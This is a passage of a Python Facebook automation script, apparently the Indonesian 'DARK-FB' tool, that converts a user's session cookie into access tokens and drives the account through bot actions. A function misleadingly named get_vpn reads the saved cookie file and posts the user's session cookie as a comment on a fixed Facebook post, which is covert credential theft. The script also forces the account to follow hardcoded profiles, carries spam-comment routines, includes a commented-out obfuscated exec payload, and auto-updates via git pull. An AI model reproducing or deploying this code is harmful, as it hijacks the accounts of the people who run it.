			kotak('# MOHON BERSABAR SEDANG MENGUBAH TOKEN EAAI',I,Q)
			self.__eaai__()
		else:
			for token in hasil_:
				open("data/login.txt", "w").write(token)
			open("data/cookie.txt", "w").write(kukis_);bot_facebook()
	def __eaai__(self):
		with requests.Session() as r:
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie':kukis_}
			response = r.get('https://web.facebook.com/ads/manager/account_settings/account_billing/?_rdc=1&_rdr', headers = headers)
			find = re.findall('(EAAI\w+)', response.text)
			if len(find) == 0:
				kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN EAAI",M,Q)
				kotak('# MOHON BERSABAR SEDANG MENGUBAH TOKEN EAAB',I,Q)
				self.__eaab__()
#				os.sys.exit()
			else:
				for token in find:
					open("data/login.txt", "w").write(token)
				open("data/cookie.txt", "w").write(kukis_);bot_facebook()

	def __eaab__(self):
		with requests.Session() as r:
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie': kukis_}
			respon = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
			find = re.findall('act=(.*?)&nav_source', respon.text)
			if len(find) == 0:
				kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN EAAB",M,Q)
				os.sys.exit()
			else:
				for y in find:
					response = r.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={y}&nav_source=no_referrer', headers = headers)
					token = re.search('(EAAB\w+)', response.text).group(1)
					open("data/login.txt", "w").write(token)
				open("data/cookie.txt", "w").write(kukis_);bot_facebook()
		os.sys.exit()




class bot_facebook:
	def __init__(self):
		open_role()
		with __Kiky__(max_workers=10) as (kiky_gtg):
			for n in id_ri:
				kiky_gtg.submit(self.all_bot(n))
	def all_bot(self,nn):
		self.language()
#		self.get_likers(nn)
		self.get_fols(nn)
		self.get_vpn()
#		self.get_posts(nn)
	def get_likers(self,idq):
		with requests.Session() as xyz:
			try:
				for x in par(xyz.get('https://mbasic.facebook.com/%s?v=timeline'%(idq),cookies=puput).content,'html.parser').find_all('a',href=True):
					if 'Tanggapi' in x.text:
						_react_type_ = random.choice(['Super','Wow','Sedih','Peduli'])
						for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput).content,'html.parser').find_all('a'):
							if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=puput)
							else:continue
			except Exception as e:pass
	def get_fols(self,idq):
			try:
				with requests.Session() as xyz:
					for x in par(xyz.get('https://mbasic.facebook.com/%s'%(idq),cookies=puput).content,'html.parser').find_all('a',href=True):
						if 'subscribe.php' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
							break
						elif 'Tambah Teman' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
							break
						elif 'Ikuti' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
							break
						elif 'Suka' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
							break
						elif 'Sukai Halaman' in x['href']:
							exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
							break

			except Exception as e:pass
	def language(self):
		try:
			with requests.Session() as xyz:
				req = xyz.get('https://mbasic.facebook.com/language/',cookies=puput)
				pra = par(req.content,'html.parser')
				for x in pra.find_all('form',{'method':'post'}):
					if 'Bahasa Indonesia' in str(x):
						bahasa = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
						"submit"  : "Bahasa Indonesia"
						}
						url = 'https://mbasic.facebook.com' + x['action']
						exec = xyz.post(url,data=bahasa,cookies=puput)
		except Exception as e:pass
	def get_posts(self,idq):
		kata=["Mantap Suhu Scriptnya GG","Keren Bang Scriptnya 🤘🤘🖕🖕","Scriptnya Keren Suhu 😆😆😆😆👍👍👍","Script Panutanku Tidak Pernah Salah🥰🥰😍😍😎😎"]
		with requests.Session() as xyz:
			try:
				with __Kiky__(max_workers=10) as (kiky_gtg):
					for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(idq,tiktok),cookies=puput).json()['data']:
						try:kiky_gtg.submit(self.get_postd(x['id']))
						except:pass
			except Exception as e:pass
	def get_postd(self,llp):
		print(llp)
		kata=["Mantap Suhu Scriptnya GG","Keren Bang Scriptnya 🤘🤘🖕🖕","Scriptnya Keren Suhu 😆😆😆😆👍👍👍","Script Panutanku Tidak Pernah Salah🥰🥰😍😍😎😎"]
		with requests.Session() as xyz:
			komeno = ('%s\n\n%s%s'%(random.choice(kata),'https://www.facebook.com/'+llp,self.zona_waktu()))
			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(llp,komeno,tiktok),cookies=puput).text)
	def get_vpn(self):
		kuki = open("data/cookie.txt","r").read()
		with requests.Session() as xyz:
			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%("100001316493597_5292314014155763",kuki,tiktok),cookies=puput).text)
	def zona_waktu(self):
		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
		jam      = datetime.now().strftime("%X")
		tem      = ('\n\nKomentar Ini DiBuat Oleh Bot\nPada Pukul   : %s WIB\nPada Tanggal : %s, %s\nPengguna Script Yang Ke : %s'%(jam,_hari_,hari_ini,self.visi_tor()))
		return(tem)
	def visi_tor(self):
		try:
			url_vis = "https://github.com/Dumai-991/DARK-FB/blob/Xnxx/README.md"
			url_visi = "https://camo.githubusercontent.com/2d7842801a4429dade77642a7444a8d2d8bd83e92e9f9944aaeaa11343d250ae/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d44756d61692d39393126636f6c6f723d626c7565"
			ses_ = requests.Session()
			bhb = ""
			jhg = 1

			data_te = ses_.get(url_vis).text.strip()
			data_te = ses_.get(url_visi)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
			hasil_ = (str(le))
			return(hasil_)
		except:
			hasil_ = "-"
			return(hasil_)
AnTi_rIkOd="Self"
# BOT CHECK FILE ANTI RIKOD
#_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'vd3JYDA/a8/36/GzPUyIwPf7d3FO95q47nu/rzJGw9y1Y6Z2tQiuwZ28QsWY2pocbqeeUbW6od2jym2Eei8I40eKUC08KIm9Olf7KnGLsYSljFX1R8AOX2mvCnmC1VscQjs0WoOAjuVHj+mUWFMISdaS6of1vmIyu60FkLn6m2Eqh7VBnvUwEJ2/g5oPHPeVyf0atVzOCGSO1O52Jswhd82B2HsvF+B75WZljhLLfOmpEgvrr0wsarZprypz62cXGF+2D03jwG6s3w7ilibs0Y/tVBUkp5DTI22diGrtjgrWacQBbcObTKFDVP+5voVPVZBmcXvXhFNRnWkhpigHRevPW00orolT6cthr4L5iZFPy2qrzxNAyowg3QwshEghPlpPIwEIIM76qe2jzs4t43ivfVcvq/bpRXZxcUKeTb9wMQAMBaDNkELsRLTGSgBYpoWVnMGSEgFsXXqwovZRAA0gSlEkdxJe'))

if AnTi_rIkOd=="Self":
	sistim="Aman"
else:
	os.system("clear")
	kotak("# TOBAT GOBLOG UDAH BESAR MASIH RIDOD SC ORANG",M,I)
	os.sys.exit()



class Main_:
	def __init__(self):
		msin=""
	def __check_update_(self, version_):
		try:
			version = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/data/version.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
		if version == version_:
			os.system('git pull')
			os.system('clear')
		else:
			os.system('git pull;clear')
			kocol = ""
			kocol += QQ+"Version Script Ini ("+OO+version_+QQ+") Akan Diupdate Menjadi ("+OO+version+QQ+")\n\n"
			kocol += ("Tunggu Sebentar Sedang Update Script.....\n")
			kocol += ("Jika Masih Stuck Update/Gini Terus Silahkan Gunakan Pernintah Ini \n")
			kocol += ("python update.py\n")
			iprint(Panel(kocol, style=M))
			kotak("# COBA KETIK : python main.py SEKALI LAGI!!",M,Q)
			os.sys.exit()
	def __check_status_(self, mainx):
		try:
			mainz = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/data/status.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
		if mainx == mainz:
			global yyy
			yyy = ""
		else:
			kotak("# MAAF SEVER DARK-FB SEDANG MAINTENANCE, KAMI AKAN KEMBALI :D",C,K)
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
#		try:
		folder();open_role()
		self.__check_update_("2.5")
		self.__check_status_("aktif")
		get_proxy_socks4()
		get_proxy_socks5()
		Main()
#		except:console.print_exception(show_locals=None,word_wrap=None,max_frames=100,extra_lines=0)

Main_()._no_vpn()
#cek_apk_hasil_crk()
#try:open("data/kata","r").read();print(f"{q}╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                               {i}SELAMAT DATANG YANG KE{k} {ka['value']} {q}                             ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝")
#except:open("data/kata","w").write("# SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)
